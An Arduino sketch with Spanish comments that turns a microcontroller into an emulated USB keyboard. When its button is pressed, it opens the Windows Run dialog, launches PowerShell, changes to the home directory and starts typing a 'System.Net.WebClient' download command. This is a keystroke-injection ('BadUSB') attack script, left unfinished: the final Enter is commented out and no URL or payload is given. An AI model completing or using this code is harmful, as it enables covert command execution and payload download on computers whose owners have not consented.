#include<Keyboard.h>

const int buttonPin = 2;          // Pin del boton
int previousButtonState = HIGH;   // Estado del boton
int counter = 0;                  // Contador del boton por cada pulsp
int check = 0;

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  pinMode(buttonPin, INPUT);
  Keyboard.begin();  
}

void loop()
{
  int buttonState = digitalRead(buttonPin);
  
  if ((buttonState != previousButtonState) && (buttonState == HIGH))
  {
    delay(500);

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
  
    delay(500);
    Keyboard.print("powershell");
    typeKey(KEY_RETURN);
  
    delay(500);
  
    Keyboard.print("cd ~/");
    typeKey(KEY_RETURN);
    
    delay(500);
    Keyboard.print("(new-object System.Net.WebClient)");
    //typeKey(KEY_RETURN);
  }
  previousButtonState = buttonState;
}
